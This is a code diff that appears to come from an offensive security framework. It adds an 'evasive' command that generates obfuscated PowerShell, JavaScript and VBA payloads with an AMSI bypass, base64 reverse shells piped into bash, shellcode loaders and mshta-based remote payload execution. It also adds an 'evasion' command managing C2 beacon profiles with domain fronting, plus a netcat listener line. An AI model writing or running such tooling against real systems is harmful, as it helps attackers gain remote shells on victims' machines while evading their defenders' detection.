@@ -214,6 +214,106 @@ class EvasivePayloadCommandSet(LazyOwnCommandSet):
                 print_msg(f"[{name}]")
                 print_msg(f"  {cmd}\n")
 
+    @cmd2.with_category(PAYLOAD_CATEGORY)
+    def do_evasive(self, line: str) -> None:
+        """Generate detection-evading payloads with multiple obfuscation strategies.
+
+        Usage:
+            evasive ps <raw_payload>   Obfuscate a PowerShell payload (AMSI bypass + encoding)
+            evasive js <raw_payload>   Obfuscate a JavaScript payload
+            evasive vba <raw_payload>  Obfuscate a VBA macro payload
+            evasive rev <rhost> <rport> [python|bash|node]  Evasive reverse shell
+            evasive sc <b64_shellcode> [early_bird|virtualalloc]  Shellcode loader
+            evasive lolbas <payload_url> [technique]  LOLBAS execution
+            evasive poly <command> [iterations]  Polymorphic command mutation
+            evasive tech                 List all evasion techniques
+        """
+        from modules.evasive_payloads import EvasivePayloadGenerator
+
+        gen = EvasivePayloadGenerator()
+        parts = line.strip().split()
+        if not parts:
+            print_error("Usage: evasive <ps|js|vba|rev|sc|lolbas|poly|tech> [args...]")
+            return
+
+        subcmd = parts[0].lower()
+
+        if subcmd == "ps":
+            raw = " ".join(parts[1:])
+            if not raw:
+                print_error("Provide a PowerShell payload to obfuscate.")
+                return
+            obf = gen.generate_powershell_obfuscated(raw, obfuscation_level=3)
+            print_msg(obf)
+            copy2clip(obf)
+
+        elif subcmd == "js":
+            raw = " ".join(parts[1:])
+            if not raw:
+                print_error("Provide a JavaScript payload to obfuscate.")
+                return
+            obf = gen.generate_javascript_obfuscated(raw)
+            print_msg(obf)
+            copy2clip(obf)
+
+        elif subcmd == "vba":
+            raw = " ".join(parts[1:])
+            if not raw:
+                print_error("Provide a VBA macro to obfuscate.")
+                return
+            obf = gen.generate_vba_obfuscated(raw)
+            print_msg(obf)
+            copy2clip(obf)
+
+        elif subcmd == "rev":
+            rhost = parts[1] if len(parts) > 1 else self.params.get("rhost", "127.0.0.1")
+            rport = int(parts[2]) if len(parts) > 2 else self.params.get("rport", 4444)
+            technique = parts[3] if len(parts) > 3 else "python"
+            b64 = gen.generate_linux_evasive(rhost, rport, technique)
+            print_msg(f"echo {b64} | base64 -d | bash")
+            copy2clip(b64)
+
+        elif subcmd == "sc":
+            sc_b64 = parts[1] if len(parts) > 1 else ""
+            if not sc_b64:
+                print_error("Provide base64-encoded shellcode.")
+                return
+            technique = parts[2] if len(parts) > 2 else "early_bird_apc"
+            loader = gen.generate_shellcode_loader_powershell(sc_b64, technique)
+            print_msg(loader)
+            copy2clip(loader)
+
+        elif subcmd == "lolbas":
+            url = parts[1] if len(parts) > 1 else ""
+            if not url:
+                print_error("Provide a payload URL.")
+                return
+            technique = parts[2] if len(parts) > 2 else "mshta"
+            cmd, desc = gen.generate_lolbas_execution(url, technique)
+            print_msg(f"Technique: {desc}")
+            print_msg(f"Command: {cmd}")
+            copy2clip(cmd)
+
+        elif subcmd == "poly":
+            cmd = " ".join(parts[1:3]) if len(parts) > 1 else ""
+            iterations = int(parts[3]) if len(parts) > 3 else 5
+            if not cmd:
+                print_error("Provide a command to obfuscate.")
+                return
+            poly = gen.generate_polymorphic_command(cmd, iterations)
+            print_msg(poly)
+            copy2clip(poly)
+
+        elif subcmd == "tech":
+            techs = gen.list_techniques()
+            for category, items in techs.items():
+                print_msg(f"\n{category}:")
+                for item in items:
+                    print_msg(f"  - {item}")
+
+        else:
+            print_error(f"Unknown subcommand: {subcmd}")
+
     def _print_usage(self, fmt: str, path: str, lhost: str, lport: int) -> None:
         """Print usage instructions for the generated payload."""
         print_msg("\n--- Usage ---")
@@ -231,6 +331,59 @@ class EvasivePayloadCommandSet(LazyOwnCommandSet):
         elif fmt == "hex":
             print_msg(f"Paste hex string into shellcode loader")
         print_msg(f"Start listener: nc -lvnp {lport}")
+
+    @cmd2.with_category(PAYLOAD_CATEGORY)
+    def do_evasion(self, line):
+        """Generate and manage C2 evasion profiles.
+
+        Usage:
+            evasion generate [windows|linux|mac]   Generate a new evasion profile
+            evasion rotate                          Rotate to a fresh profile
+            evasion status                          Show active profile
+            evasion history                         Show profile history
+        """
+        from modules.evasion_engine import EvasionEngine
+
+        ee = EvasionEngine(self.params)
+        parts = line.strip().split()
+        subcmd = parts[0].lower() if parts else "status"
+
+        if subcmd == "generate":
+            os_family = parts[1] if len(parts) > 1 else "windows"
+            profile = ee.generate_profile(os_family)
+            print_msg(ee.profile_to_json(profile))
+
+        elif subcmd == "rotate":
+            profile = ee.rotate_profile()
+            print_msg(f"Rotated to new profile: {profile.profile_id}")
+            print_msg(ee.profile_to_json(profile))
+
+        elif subcmd == "history":
+            records = ee.get_history()
+            if not records:
+                print_msg("No profile history.")
+                return
+            for r in records[-10:]:
+                print_msg(
+                    f"  {r.get('profile_id', '?')[:16]} "
+                    f"created={r.get('created_at', '?')[:19]} "
+                    f"front={r.get('domain_front', '?')}"
+                )
+
+        elif subcmd == "status":
+            profile = ee.get_active_profile()
+            if profile is None:
+                profile = ee.generate_profile()
+            beer = ee.get_beacon_config()
+            print_msg(f"Active profile: {profile.profile_id}")
+            print_msg(f"  User-Agent:  {profile.user_agent[:60]}")
+            print_msg(f"  JA4 hash:    {profile.ja4_hash}")
+            print_msg(f"  Sleep/Jitter: {beer['sleep']}s / {beer['jitter_ms']}ms")
+            print_msg(f"  Domain front: {profile.domain_front}")
+            print_msg(f"  Method:       {profile.http_method}")
+
+        else:
+            print_error(f"Unknown subcommand: {subcmd}. Use: generate | rotate | status | history")
 
 
 def _generate_shellcode(lhost: str, lport: int, target_os: str, arch: str) -> bytes:
